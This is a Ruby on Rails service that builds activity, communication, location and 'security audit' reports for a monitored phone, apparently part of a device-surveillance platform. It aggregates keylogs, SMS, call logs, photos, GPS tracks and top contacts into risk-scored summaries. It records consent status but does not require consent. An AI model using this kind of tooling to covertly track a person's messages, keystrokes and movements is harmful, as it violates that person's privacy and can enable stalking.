# frozen_string_literal: true

class ReportGenerationService < ApplicationService
  TEMPLATES = %w[device_activity security_audit location communication].freeze
  FORMATS = %w[pdf html json].freeze

  def initialize(device, options = {})
    @device = device
    @template = options[:template] || 'device_activity'
    @format = options[:format] || 'json'
    @period = options[:period] || 'weekly'
    @start_date = options[:start_date] || period_start
    @end_date = options[:end_date] || Time.current
  end

  def call
    return Result.failure("Invalid template: #{@template}") unless TEMPLATES.include?(@template)
    return Result.failure("Invalid format: #{@format}") unless FORMATS.include?(@format)
    return Result.failure('Device is required') unless @device

    report_data = send("generate_#{@template}")
    report_data[:risk_assessment] = calculate_risk_assessment
    report_data[:metadata] = report_metadata

    case @format
    when 'html' then Result.success(render_html(report_data))
    when 'pdf'  then Result.success(render_pdf(report_data))
    else             Result.success(report_data)
    end
  rescue StandardError => e
    Rails.logger.error("[ReportGenerationService] #{e.message}")
    Result.failure(e.message)
  end

  def self.available_templates
    TEMPLATES.map { |t| { id: t, label: t.titleize, description: template_description(t) } }
  end

  def self.template_description(template)
    {
      'device_activity'  => 'Overview of device activity including commands, keylogs, and app usage',
      'security_audit'   => 'Security posture analysis with risk indicators and anomalies',
      'location'         => 'Location tracking summary with heatmaps and movement patterns',
      'communication'    => 'SMS, call logs, and messaging activity summary'
    }[template] || ''
  end

  private

  def period_start
    case @period
    when 'daily'   then 1.day.ago
    when 'weekly'  then 7.days.ago
    when 'monthly' then 30.days.ago
    else 7.days.ago
    end
  end

  def report_metadata
    {
      device_id: @device.device_id,
      device_name: @device.name,
      template: @template,
      period: @period,
      start_date: @start_date.iso8601,
      end_date: @end_date.iso8601,
      generated_at: Time.current.iso8601
    }
  end

  # --- Template generators ---

  def generate_device_activity
    {
      summary: {
        total_commands: scoped_commands.count,
        completed_commands: scoped_commands.where(status: 'completed').count,
        total_keylogs: scoped_keylogs.count,
        total_sms: scoped_sms.count,
        total_calls: scoped_calls.count,
        total_photos: scoped_photos.count,
        total_locations: scoped_locations.count
      },
      daily_breakdown: daily_activity_breakdown,
      top_apps: top_apps_by_usage,
      peak_hours: peak_activity_hours
    }
  end

  def generate_security_audit
    {
      summary: {
        anomalies_detected: detect_anomalies.size,
        risk_level: risk_level_label,
        consent_status: consent_status,
        last_check_in: @device.updated_at&.iso8601
      },
      anomalies: detect_anomalies,
      permission_changes: [],
      unusual_activity: unusual_activity_indicators
    }
  end

  def generate_location
    locations = scoped_locations
    {
      summary: {
        total_points: locations.count,
        unique_areas: estimate_unique_areas(locations),
        total_distance_km: estimate_total_distance(locations)
      },
      frequent_locations: frequent_locations,
      daily_movement: daily_movement_summary,
      geofence_events: recent_geofence_events
    }
  end

  def generate_communication
    {
      summary: {
        total_sms_sent: scoped_sms.where(message_type: 'sent').count,
        total_sms_received: scoped_sms.where(message_type: 'received').count,
        total_calls: scoped_calls.count,
        unique_contacts: unique_contact_count
      },
      top_contacts: top_contacts_by_frequency,
      daily_communication: daily_communication_breakdown,
      call_duration_stats: call_duration_statistics
    }
  end

  # --- Risk Assessment ---

  def calculate_risk_assessment
    score = 0
    factors = []

    if detect_anomalies.any?
      score += 30
      factors << { factor: 'anomalies_detected', weight: 30, detail: "#{detect_anomalies.size} anomalies found" }
    end

    if @device.updated_at && @device.updated_at < 24.hours.ago
      score += 20
      factors << { factor: 'device_inactive', weight: 20, detail: 'No check-in for 24+ hours' }
    end

    if scoped_locations.where('created_at > ?', 1.hour.ago).none?
      score += 10
      factors << { factor: 'no_recent_location', weight: 10, detail: 'No location data in last hour' }
    end

    { score: [score, 100].min, level: risk_level_for(score), factors: factors }
  end

  def risk_level_for(score)
    case score
    when 0..25   then 'low'
    when 26..50  then 'medium'
    when 51..75  then 'high'
    else              'critical'
    end
  end

  def risk_level_label
    risk_level_for(calculate_risk_assessment[:score])
  end

  # --- Data queries ---

  def scoped_commands
    @device.pending_commands.where(created_at: @start_date..@end_date)
  end

  def scoped_keylogs
    @device.keylogs.where(created_at: @start_date..@end_date)
  end

  def scoped_sms
    @device.sms_messages.where(created_at: @start_date..@end_date)
  end

  def scoped_calls
    @device.call_logs.where(created_at: @start_date..@end_date)
  end

  def scoped_photos
    @device.pictures.where(created_at: @start_date..@end_date)
  end

  def scoped_locations
    @device.geo_locations.where(created_at: @start_date..@end_date)
  end

  def daily_activity_breakdown
    (@start_date.to_date..@end_date.to_date).map do |date|
      range = date.all_day
      {
        date: date.to_s,
        keylogs: @device.keylogs.where(created_at: range).count,
        sms: @device.sms_messages.where(created_at: range).count,
        calls: @device.call_logs.where(created_at: range).count,
        photos: @device.pictures.where(created_at: range).count
      }
    end
  end

  def top_apps_by_usage
    scoped_keylogs
      .group(:application_label)
      .count
      .sort_by { |_, v| -v }
      .first(10)
      .map { |app, count| { app: app || 'Unknown', count: count } }
  end

  def peak_activity_hours
    hours = scoped_keylogs.group_by_hour(:created_at, format: '%H').count rescue
            scoped_keylogs.group("EXTRACT(HOUR FROM created_at)").count
    hours.sort_by { |_, v| -v }.first(5).map { |h, c| { hour: h, count: c } }
  rescue StandardError
    []
  end

  def detect_anomalies
    @anomalies ||= begin
      anomalies = []
      daily_counts = daily_activity_breakdown.map { |d| d[:keylogs] }
      avg = daily_counts.sum.to_f / [daily_counts.size, 1].max
      std_dev = Math.sqrt(daily_counts.map { |c| (c - avg)**2 }.sum / [daily_counts.size, 1].max)

      daily_activity_breakdown.each do |day|
        if std_dev > 0 && day[:keylogs] > avg + (2 * std_dev)
          anomalies << { date: day[:date], type: 'high_activity', value: day[:keylogs], threshold: (avg + 2 * std_dev).round }
        end
      end
      anomalies
    end
  end

  def unusual_activity_indicators
    indicators = []
    if scoped_keylogs.where('created_at::time BETWEEN ? AND ?', '00:00:00', '05:00:00').count > 10
      indicators << { type: 'late_night_activity', description: 'Significant activity between midnight and 5 AM' }
    end
    indicators
  rescue StandardError
    []
  end

  def consent_status
    consent = DeviceConsent.find_by(device_id: @device.id, consent_type: 'data_collection')
    consent&.active? ? 'granted' : 'not_granted'
  rescue StandardError
    'unknown'
  end

  def frequent_locations
    scoped_locations
      .select(:latitude, :longitude)
      .group(:latitude, :longitude)
      .order(Arel.sql('COUNT(*) DESC'))
      .limit(10)
      .count
      .map { |(lat, lng), count| { latitude: lat.to_f, longitude: lng.to_f, visits: count } }
  rescue StandardError
    []
  end

  def estimate_unique_areas(locations)
    locations.select(:latitude, :longitude).distinct.count rescue 0
  end

  def estimate_total_distance(locations)
    points = locations.order(:created_at).pluck(:latitude, :longitude)
    return 0 if points.size < 2

    total = 0
    points.each_cons(2) do |(lat1, lng1), (lat2, lng2)|
      total += haversine_km(lat1.to_f, lng1.to_f, lat2.to_f, lng2.to_f)
    end
    total.round(2)
  rescue StandardError
    0
  end

  def haversine_km(lat1, lng1, lat2, lng2)
    r = 6371.0
    d_lat = (lat2 - lat1) * Math::PI / 180
    d_lng = (lng2 - lng1) * Math::PI / 180
    a = Math.sin(d_lat / 2)**2 + Math.cos(lat1 * Math::PI / 180) * Math.cos(lat2 * Math::PI / 180) * Math.sin(d_lng / 2)**2
    r * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))
  end

  def daily_movement_summary
    (@start_date.to_date..@end_date.to_date).map do |date|
      locs = @device.geo_locations.where(created_at: date.all_day)
      { date: date.to_s, points: locs.count, distance_km: estimate_total_distance(locs) }
    end
  end

  def recent_geofence_events
    GeofenceEvent.where(smartphone: @device)
                 .where(triggered_at: @start_date..@end_date)
                 .order(triggered_at: :desc)
                 .limit(50)
                 .map { |e| { geofence: e.geofence&.name, type: e.event_type, at: e.triggered_at.iso8601 } }
  rescue StandardError
    []
  end

  def unique_contact_count
    sms_contacts = scoped_sms.distinct.count(:address) rescue 0
    call_contacts = scoped_calls.distinct.count(:phone_number) rescue 0
    sms_contacts + call_contacts
  end

  def top_contacts_by_frequency
    sms_top = scoped_sms.group(:address).count.sort_by { |_, v| -v }.first(5)
    call_top = scoped_calls.group(:phone_number).count.sort_by { |_, v| -v }.first(5)

    contacts = {}
    sms_top.each { |addr, c| contacts[addr] = { sms: c, calls: 0 } }
    call_top.each { |num, c| (contacts[num] ||= { sms: 0, calls: 0 })[:calls] = c }
    contacts.map { |id, data| { contact: id, sms_count: data[:sms], call_count: data[:calls] } }
  rescue StandardError
    []
  end

  def daily_communication_breakdown
    (@start_date.to_date..@end_date.to_date).map do |date|
      range = date.all_day
      {
        date: date.to_s,
        sms_sent: @device.sms_messages.where(created_at: range, message_type: 'sent').count,
        sms_received: @device.sms_messages.where(created_at: range, message_type: 'received').count,
        calls: @device.call_logs.where(created_at: range).count
      }
    end
  end

  def call_duration_statistics
    durations = scoped_calls.pluck(:duration).compact.map(&:to_i)
    return { total: 0, average: 0, max: 0, min: 0 } if durations.empty?

    {
      total: durations.sum,
      average: (durations.sum.to_f / durations.size).round(1),
      max: durations.max,
      min: durations.min
    }
  rescue StandardError
    { total: 0, average: 0, max: 0, min: 0 }
  end

  # --- Rendering ---

  def render_html(data)
    {
      content_type: 'text/html',
      body: build_html(data),
      filename: "report_#{@template}_#{@device.device_id}_#{Time.current.to_i}.html"
    }
  end

  def render_pdf(data)
    # PDF generation requires a gem like Prawn or wicked_pdf.
    # Stub: returns HTML with PDF metadata for downstream conversion.
    {
      content_type: 'application/pdf',
      html_source: build_html(data),
      filename: "report_#{@template}_#{@device.device_id}_#{Time.current.to_i}.pdf",
      note: 'PDF rendering requires prawn or wicked_pdf gem. HTML source provided for conversion.'
    }
  end

  def build_html(data)
    <<~HTML
      <!DOCTYPE html>
      <html>
      <head><title>#{@template.titleize} Report</title>
      <style>
        body { font-family: -apple-system, sans-serif; margin: 40px; color: #1e293b; }
        h1 { color: #0f172a; border-bottom: 2px solid #3b82f6; padding-bottom: 8px; }
        table { border-collapse: collapse; width: 100%; margin: 16px 0; }
        th, td { border: 1px solid #e2e8f0; padding: 8px 12px; text-align: left; }
        th { background: #f1f5f9; }
        .risk-low { color: #10b981; } .risk-medium { color: #f59e0b; }
        .risk-high { color: #ef4444; } .risk-critical { color: #dc2626; font-weight: bold; }
        .metadata { color: #64748b; font-size: 0.85em; margin-bottom: 24px; }
      </style>
      </head>
      <body>
        <h1>#{@template.titleize} Report</h1>
        <div class="metadata">
          Device: #{@device.device_id} | Period: #{@start_date.to_date} – #{@end_date.to_date} | Generated: #{Time.current.strftime('%Y-%m-%d %H:%M')}
        </div>
        <h2>Risk Assessment</h2>
        <p class="risk-#{data[:risk_assessment][:level]}">
          Score: #{data[:risk_assessment][:score]}/100 (#{data[:risk_assessment][:level].upcase})
        </p>
        <h2>Summary</h2>
        <pre>#{JSON.pretty_generate(data[:summary] || {})}</pre>
      </body>
      </html>
    HTML
  end
end
